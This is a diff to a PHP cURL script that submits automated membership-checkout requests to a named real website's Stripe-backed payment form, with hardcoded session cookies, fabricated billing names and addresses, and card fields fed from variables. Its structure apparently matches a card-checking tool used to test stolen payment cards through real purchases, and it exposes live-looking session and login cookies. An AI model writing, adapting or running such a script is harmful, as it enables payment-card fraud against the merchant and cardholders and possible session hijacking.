@@ -179,10 +179,10 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 'method: POST',
 'path: /membership-account-2/membership-checkout/?level=2',
 'scheme: https',
-'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-'accept-language: en-US,en;q=0.5',
+'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+'accept-language: en-US,en;q=0.9,id;q=0.8',
 'content-type: application/x-www-form-urlencoded',
-'cookie: asp_transient_id=7631f233564c455d06fd46ed351e2345; PHPSESSID=07e720e9a02b5fa35fc44f81c90ddbfa; pmpro_visit=1; __stripe_mid=fde419d9-a51d-44ef-8169-e81cd4ab02911d6f36; __stripe_sid=45fff18a-d841-4987-a3b9-db3922647f6b8ae46d; wordpress_logged_in_e229b7ca44d53494e774d22d5ca6fcd4=taccara0%7C1688050847%7CXllFy5MdKOKoxW14S4aUlZElJgH2khXWCDrsfc58et7%7Cc7b140ec6bb18b260b959141f8411b5311f091694e302aed8b8c8acce9b24bb1',
+'cookie: asp_transient_id=7d58970a78efdd637397d46967bfbfde; PHPSESSID=c4f2069bfd286614ad65a08d68c0b254; pmpro_visit=1; visid_incap_3026947=bufnu1IMTpa2GF1utur7DCe3gmYAAAAAQUIPAAAAAABz9Sfu5fKPfGSGFj8GA4Cm; incap_ses_1064_3026947=ivpQBrP/aiiGZ7V/bxbEDii3gmYAAAAAAaBqyl+JGf/uQipNdjdVFg==; __stripe_mid=63d6e3fc-8439-48ed-a437-8584d4a88d5c3b7fdf; __stripe_sid=de8ec765-f839-4290-b807-e557e618755f27f32d',
 'origin: https://jaxcc.org',
 'referer: https://jaxcc.org/membership-account-2/membership-checkout/?level=2',
 'sec-fetch-dest: document',
@@ -193,7 +193,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'level=2&checkjavascript=1&other_discount_code=&username='.$name.'&password=4430440030415343&password2=4430440030415343&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&bfirstname=jonh&blastname=cena&baddress1=3324+Chapel+Street&baddress2=&bcity=Sugar+Land&bstate=Texas&bzipcode=77478&bcountry=US&bphone=281-624-2480&CardType=visa&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX5745&ExpirationMonth=10&ExpirationYear=2025');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'pmpro_level=2&checkjavascript=1&pmpro_other_discount_code=&username='.$name.'&password=4430440030415343&password2=4430440030415343&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&bfirstname=Gg&blastname=mila&baddress1=870+New+Jersey+34&baddress2=&bcity=Matawan&bstate=New+Mexico&bzipcode=07747&bcountry=US&bphone=1201627733&CardType=visa&pmpro_discount_code=&pmpro_checkout_nonce=eef2cd87ba&_wp_http_referer=%2Fmembership-account-2%2Fmembership-checkout%2F%3Flevel%3D2&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX6946&ExpirationMonth=06&ExpirationYear=2026');
 
 
 
